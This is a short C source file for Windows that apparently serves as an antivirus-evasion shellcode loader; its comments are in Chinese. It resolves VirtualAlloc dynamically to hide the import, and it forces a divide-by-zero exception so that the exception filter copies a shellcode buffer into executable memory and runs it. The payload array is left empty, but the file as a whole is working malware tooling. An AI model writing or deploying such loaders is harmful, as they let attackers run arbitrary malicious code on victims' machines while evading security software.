#include<Windows.h>
#include<stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode[] = "";

int a = 1;
int b = 0;

#include "safeApi.h"

int ExceptFilter()
{
    b = 1;
    // 动态获取VirtualAlloc
    typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)SafeGetProcAddress(L"kernel32.dll", "VirtualAlloc");
    if (myVirtualAlloc) {
        LPVOID execMem = myVirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (execMem) {
            memcpy(execMem, shellcode, sizeof(shellcode));
            ((void(*)())execMem)();
        }
    }
    return EXCEPTION_CONTINUE_EXECUTION;
}

int main(){
    __try
    {
        int c = a / b;  //只要能触发异常即可
    }
    __except(ExceptFilter()) {

    }
    return 0;
}
